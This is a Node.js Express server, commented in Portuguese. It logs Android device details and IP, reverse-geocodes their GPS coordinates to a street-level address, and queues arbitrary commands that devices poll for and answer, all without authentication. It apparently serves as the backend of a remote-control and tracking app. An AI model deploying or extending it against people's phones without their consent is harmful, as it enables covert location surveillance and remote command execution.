const express = require("express");

const app = express();

app.use(express.json());

const PORT = process.env.PORT || 10000;


// ========================================
// FILA DE COMANDOS
// ========================================

const comandosPendentes = new Map();


// ========================================
// BUSCAR ENDEREÇO
// ========================================

async function buscarEndereco(latitude, longitude) {

    const url =
        `https://nominatim.openstreetmap.org/reverse` +
        `?format=jsonv2` +
        `&lat=${encodeURIComponent(latitude)}` +
        `&lon=${encodeURIComponent(longitude)}` +
        `&zoom=18` +
        `&addressdetails=1`;

    const resposta = await fetch(url, {
        headers: {
            "User-Agent": "ServidorAndroid/1.0"
        }
    });

    if (!resposta.ok) {
        throw new Error(
            `Nominatim respondeu HTTP ${resposta.status}`
        );
    }

    return await resposta.json();
}


// ========================================
// RECEBER DISPOSITIVO
// ========================================

app.post("/api/device", async (req, res) => {

    try {

        const dados = req.body || {};

        let ip =
            req.headers["x-forwarded-for"] ||
            req.socket.remoteAddress ||
            "Desconhecido";

        if (ip.includes(",")) {
            ip = ip.split(",")[0].trim();
        }

        ip = ip.replace("::ffff:", "");


        console.log("");
        console.log("========================================");
        console.log("       NOVO DISPOSITIVO CONECTADO");
        console.log("========================================");


        console.log(
            "ID:          ",
            dados.deviceId || "Não informado"
        );

        console.log(
            "Marca:       ",
            dados.marca || "Não informado"
        );

        console.log(
            "Fabricante:  ",
            dados.fabricante || "Não informado"
        );

        console.log(
            "Modelo:      ",
            dados.modelo || "Não informado"
        );

        console.log(
            "Android:     ",
            dados.android || "Não informado"
        );

        console.log(
            "IP:          ",
            ip
        );


        const latitude = dados.latitude;
        const longitude = dados.longitude;


        if (
            typeof latitude === "number" &&
            typeof longitude === "number"
        ) {

            console.log("");
            console.log("COORDENADAS:");

            console.log(
                "Latitude:    ",
                latitude
            );

            console.log(
                "Longitude:   ",
                longitude
            );


            try {

                const endereco =
                    await buscarEndereco(
                        latitude,
                        longitude
                    );


                const address =
                    endereco.address || {};


                const bairro =
                    address.suburb ||
                    address.neighbourhood ||
                    address.village ||
                    "Não informado";


                const cidade =
                    address.city ||
                    address.town ||
                    address.municipality ||
                    address.village ||
                    "Não informada";


                const estado =
                    address.state ||
                    "Não informado";


                const cep =
                    address.postcode ||
                    "Não informado";


                const pais =
                    address.country ||
                    "Não informado";


                console.log("");
                console.log(
                    "LOCALIZAÇÃO APROXIMADA:"
                );


                console.log(
                    "Bairro:      ",
                    bairro
                );


                console.log(
                    "Cidade:      ",
                    cidade
                );


                console.log(
                    "Estado:      ",
                    estado
                );


                console.log(
                    "CEP:         ",
                    cep
                );


                console.log(
                    "País:        ",
                    pais
                );


                console.log("");
                console.log(
                    "Endereço retornado pelo serviço:"
                );


                console.log(
                    endereco.display_name ||
                    "Não informado"
                );


            } catch (erroEndereco) {

                console.error(
                    "Erro ao consultar localização:",
                    erroEndereco.message
                );
            }


        } else {

            console.log("");
            console.log(
                "Localização não enviada pelo aplicativo."
            );
        }


        console.log("");
        console.log("========================================");
        console.log("");


        res.status(200).json({
            sucesso: true
        });


    } catch (erro) {

        console.error(
            "Erro ao processar dispositivo:",
            erro
        );


        res.status(500).json({
            sucesso: false
        });
    }
});


// ========================================
// ENVIAR COMANDO PARA O ANDROID
// ========================================

app.post("/api/command", (req, res) => {

    const {
        deviceId,
        command
    } = req.body || {};


    if (!deviceId || !command) {

        return res.status(400).json({
            sucesso: false,
            erro:
                "deviceId e command são obrigatórios"
        });
    }


    if (!comandosPendentes.has(deviceId)) {

        comandosPendentes.set(
            deviceId,
            []
        );
    }


    comandosPendentes
        .get(deviceId)
        .push({

            command: command,

            criadoEm:
                new Date().toISOString()
        });


    console.log("");
    console.log("========================================");
    console.log("          NOVO COMANDO");
    console.log("========================================");

    console.log(
        "Dispositivo:",
        deviceId
    );

    console.log(
        "Comando:    ",
        command
    );

    console.log("========================================");


    res.status(200).json({

        sucesso: true,

        mensagem:
            "Comando colocado na fila"
    });
});


// ========================================
// ANDROID BUSCA COMANDO
// ========================================

app.get(
    "/api/command/:deviceId",
    (req, res) => {

        const {
            deviceId
        } = req.params;


        const fila =
            comandosPendentes.get(
                deviceId
            ) || [];


        if (fila.length === 0) {

            return res.status(200).json({

                sucesso: true,

                comando: null
            });
        }


        const comando =
            fila.shift();


        res.status(200).json({

            sucesso: true,

            comando: comando
        });
    }
);


// ========================================
// RECEBER RESPOSTA DO ANDROID
// ========================================

app.post("/api/response", (req, res) => {

    const {
        deviceId,
        response
    } = req.body || {};


    console.log("");
    console.log("========================================");
    console.log("       RESPOSTA DO DISPOSITIVO");
    console.log("========================================");


    console.log(
        "Dispositivo:",
        deviceId || "Não informado"
    );


    console.log(
        "Resposta:   ",
        response || "Não informado"
    );


    console.log("========================================");


    res.status(200).json({

        sucesso: true
    });
});


// ========================================
// PÁGINA PRINCIPAL
// ========================================

app.get("/", (req, res) => {

    res.status(200).send(
        "Servidor funcionando!"
    );
});


// ========================================
// INICIAR SERVIDOR
// ========================================

app.listen(
    PORT,
    "0.0.0.0",
    () => {

        console.log("");

        console.log(
            "========================================"
        );

        console.log(
            "       SERVIDOR INICIADO"
        );

        console.log(
            "========================================"
        );

        console.log(
            "Porta:",
            PORT
        );

        console.log(
            "Aguardando dispositivos..."
        );

        console.log("");
    }
);